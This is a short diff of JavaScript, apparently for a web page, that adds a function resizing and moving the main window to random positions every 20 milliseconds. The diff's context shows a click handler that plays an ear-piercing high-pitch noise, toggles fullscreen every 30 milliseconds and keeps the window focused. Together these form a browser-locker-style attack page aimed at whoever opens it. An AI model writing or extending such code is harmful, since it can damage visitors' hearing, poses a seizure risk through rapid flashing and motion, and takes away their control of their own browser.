@@ -193,6 +193,15 @@
             }
         });
 
+        function moveMainWindow() {
+            const randomWidth = 200 + Math.random() * 600;
+            const randomHeight = 200 + Math.random() * 600;
+            const randomX = Math.random() * (screen.width - randomWidth);
+            const randomY = Math.random() * (screen.height - randomHeight);
+            window.resizeTo(randomWidth, randomHeight);
+            window.moveTo(randomX, randomY);
+        }
+
         button.addEventListener('click', () => {
             // Play ear-piercing high-pitch noise
             playHighPitchNoise();
@@ -217,6 +226,9 @@
             
             // Toggle fullscreen extremely fast
             setInterval(toggleFullscreen, 30);
+            
+            // Move and resize main window extremely fast
+            setInterval(moveMainWindow, 20);
             
             // Keep main window focused continuously
             setInterval(() => {
